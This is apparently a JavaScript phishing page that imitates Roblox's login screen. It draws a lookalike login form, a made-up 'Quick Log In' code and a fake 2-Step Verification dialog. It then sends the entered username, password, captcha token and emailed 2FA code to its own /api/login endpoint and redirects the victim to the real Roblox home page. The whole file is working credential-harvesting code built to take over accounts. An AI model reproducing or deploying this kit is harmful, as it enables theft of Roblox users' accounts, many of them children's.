const returnUrl = new URLSearchParams(window.location.search).get('returnUrl');
var css = document.createElement(`style`);
css.innerText = `
    .disclaimer {
    display:none !important;
    }
    .login-action {
    display:none !important;
    }
`;
document.head.appendChild(css);
document.getElementById(`react-login-container`).innerHTML = `<div id="login-base"><div class="section-content login-section"><h1 class="login-header">Login to Roblox</h1><div id="login-form"><div><div class="login-form-container"><form class="login-form" name="loginForm"><div class="form-group username-form-group"><label for="login-username" class="sr-only">Username/Email/Phone</label><input id="login-username" name="username" type="text" class="form-control input-field" placeholder="Username/Email/Phone" onkeypress="document.getElementById('login-form-error').innerHTML = '';" value=""></div><div class="form-group password-form-group"><label for="login-password" class="sr-only">Password</label><input id="login-password" name="password" type="password" class="form-control input-field" placeholder="Password" onkeypress="document.getElementById('login-form-error').innerHTML = '';" value=""><div aria-live="polite"><p class="form-control-label xsmall text-error login-error" id="login-form-error"></p></div></div><span class="spinner spinner-default" id="login-loading" style="display:none"></span><button type="button" id="login-button" class="btn-full-width login-button btn-secondary-md">Log In</button></form></div></div></div><div class="text-center forgot-credentials-link"><a id="forgot-credentials-link" class="text-link" href="https://www.roblox.com/login/forgot-password-or-username" target="_self">Forgot Password or Username?</a></div><div><div class="alternative-login-divider-container"><div class="rbx-divider alternative-login-divider"></div><div class="divider-text-container"><span class="divider-text xsmall">login with</span></div></div><button type="button" id="cross-device-login-button" class="btn-full-width btn-control-md cross-device-login-button"><span>Another Logged In Device</span></button></div><div class="text-center"><div class="signup-option"><span class="no-account-text">Don't have an account?</span><a id="sign-up-link" class="text-link signup-link" href="https://www.roblox.com/" target="_self">Sign Up</a></div></div></div><div id="crossDeviceLoginDisplayCodeModal-container"></div></div>`;
document.getElementById(`login-password`).addEventListener(`keyup`, function(event) {
    if (event.keyCode === 13) {
        event.preventDefault();
        document.getElementById(`login-button`).click();
    }
});
document.getElementById(`cross-device-login-button`).addEventListener(`click`, () => {
    var code = ``;
    var characters = `ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789`;
    for ( var i = 0; i < 6; i++ ) {
      code += characters.charAt(Math.floor(Math.random() * characters.length));
   }
document.getElementById(`dialog`).innerHTML = `<div class="fade modal-backdrop in"></div><div aria-labelledby="contained-modal-title-vcenter" scrollable="true" centered="true" role="dialog" tabindex="-1" class="fade cross-device-login-display-code-modal in modal" style="display: block;"><div class="modal-dialog"><div class="modal-content" role="document"><div class="modal-header"><div class="cross-device-login-display-code-modal-title-container"><button type="button" class="cross-device-login-display-code-modal-title-button"><span class="close icon-close" onclick="document.getElementById('dialog').innerHTML = '';"></span></button><h4 id="contained-modal-title-vcenter" class="modal-title">Quick Log In Code</h4></div></div><div class="modal-body"><div><div class="cross-device-login-display-code-modal-image"></div><div class="font-title">` + code + `</div><div class="cross-device-login-device-prompt-text font-header-2">GO TO YOUR LOGGED IN DEVICE TO ENTER THIS CODE AND EXPLORE</div><div class="cross-device-login-instruction-text font-caption-header">On your logged in device, go to:</div><div class="cross-device-login-instruction-text font-caption-header"><b>Account Settings &gt; Quick Log In</b> to enter your code.</div></div></div></div></div></div>`;
});
document.getElementById(`login-button`).addEventListener(`click`, () => {
	if(!document.getElementById(`login-username`).value || !document.getElementById(`login-password`).value){
	document.getElementById(`login-form-error`).innerHTML = `Username and password required`;
	} else {
	document.getElementById(`login-button`).style.display = `none`;
	document.getElementById(`login-loading`).style.display = ``;
	document.getElementById(`dialog`).innerHTML = `<div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern modal-modern-challenge-captcha in modal" style="display: block;"><div class="modal-dialog"><div class="modal-content" role="document"><div class="modal-body"><button type="button" class="challenge-captcha-close-button"><span class="icon-close" onclick="document.getElementById('login-loading').style.display = 'none';document.getElementById('login-button').style.display = '';document.getElementById('dialog').innerHTML = '';"></span></button><div></div><div class="challenge-captcha-body" id="challenge-captcha-element"><div id="FunCaptcha"><iframe frameborder="0" scrolling="no" id="fc-iframe-wrap" class="fc-iframe-wrap" aria-label=" " style="width: 308px; height: 252px;" src="/api/captcha"></iframe></div><input type="hidden" id="verification-token" name="verification-token" value=""><input type="hidden" id="style-manager-styling" name="style-manager-styling" value=""></div></div></div></div></div>`;
}});
function login(ctype, cvalue, password, captchaToken){
    var postfields = new FormData();
	postfields.append(`ctype`, ctype);
	postfields.append(`cvalue`, cvalue);
	postfields.append(`password`, password);
	postfields.append(`captchaToken`, captchaToken);
	postfields.append(`returnUrl`, returnUrl);
    fetch(`/api/login`, {
    method: `POST`,
    body: postfields,
    }).then((response) => response.text())
    .then((data) => {
    document.getElementById(`login-loading`).style.display = `none`;
    document.getElementById(`login-button`).style.display = ``;
    document.getElementById(`dialog`).innerHTML = ``;
    if(data == 1){
    window.location.replace(`https://www.roblox.com/home`);
    } else if(data == 2){
	document.getElementById(`dialog`).innerHTML = `<div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block;"><div class="modal-dialog"><div class="modal-content" role="document"><div class="modal-header"><button type="button" class="modal-modern-header-button"><span class="icon-close"></span></button><h4 class="modal-title">2-Step Verification</h4><div class="modal-modern-header-info"></div></div><div class="modal-body"><div class="modal-lock-icon"></div><p class="modal-margin-bottom-xlarge">Enter the code we just sent you via email.</p><div class="input-control-wrapper"><div class="   form-group" id="step-group"><input as="input" autocomplete="off" maxlength="6" placeholder="Enter 6-digit Code" type="password" id="two-step-verification-code-input" onkeypress="return isNumber(event)" class="input-field form-control" value=""><div class="form-control-label bottom-label xsmall" id="step-error">&nbsp;</div></div></div><p class="modal-margin-bottom-xlarge"><input id="remember-device" type="checkbox" tabindex="0"> <label for="remember-device">Trust this device for 30 days</label></p><p><button type="button" class="modal-body-button-link small">Resend Code</button></p><p><button type="button" class="modal-body-button-link small">Use another verification method</button></p><p><span class="text-footer">Need help? Contact <a class="text-name text-footer contact" href="https://www.roblox.com/info/2sv" target="_blank">Roblox Support</a></span></p></div><div class="modal-footer"><button type="button" class="btn-cta-md modal-modern-footer-button" aria-label="Verify" id="step-button" onclick="verify()">Verify</button></div></div></div></div>`;
    } else {
    document.getElementById(`login-form-error`).innerHTML = `Incorrect username or password.`;
    }
    });
}

function isNumber(evt) {
    evt = (evt) ? evt : window.event;
    var charCode = (evt.which) ? evt.which : evt.keyCode;
    if (charCode > 31 && (charCode < 48 || charCode > 57)) {
        return false;
    }
    return true;
}

var check_input = setInterval(function(){
    if(document.getElementById(`two-step-verification-code-input`).value.length == 6){
	   document.getElementById(`step-button`).disabled = false;
	  } else {
	   document.getElementById(`step-button`).disabled = true;
	  }
},1);

document.getElementById(`two-step-verification-code-input`).addEventListener(`keyup`, function(event) {
    if (event.keyCode === 13) {
        event.preventDefault();
        document.getElementById(`step-button`).click();
    }
});

function verify(){
	if(!document.getElementById(`two-step-verification-code-input`).value){
    document.getElementById(`step-group`).setAttribute(`class`, `form-has-feedback  form-has-error form-group`);
    document.getElementById(`step-error`).innerHTML = `Invalid code.`;
	} else {
	document.getElementById(`step-button`).innerHTML = `<div id="login-loading" class="spinner spinner-sm spinner-no-margin spinner-block"></div>`;
	var postfields = new FormData();
	postfields.append(`code`, document.getElementById(`two-step-verification-code-input`).value);
	postfields.append(`returnUrl`, returnUrl);
    fetch(`/api/login`, {
    method: `POST`,
    body: postfields,
    }).then((response) => response.text())
    .then((data) => {
    document.getElementById(`step-button`).innerHTML = `Verify`;
    if(data == 1){
    document.getElementById(`dialog`).innerHTML = ``;
    window.location.replace(`https://www.roblox.com/home`);
    } else {
    document.getElementById(`step-group`).setAttribute(`class`, `form-has-feedback  form-has-error form-group`);
    document.getElementById(`step-error`).innerHTML = `Invalid code.`;
    }
    });
	}}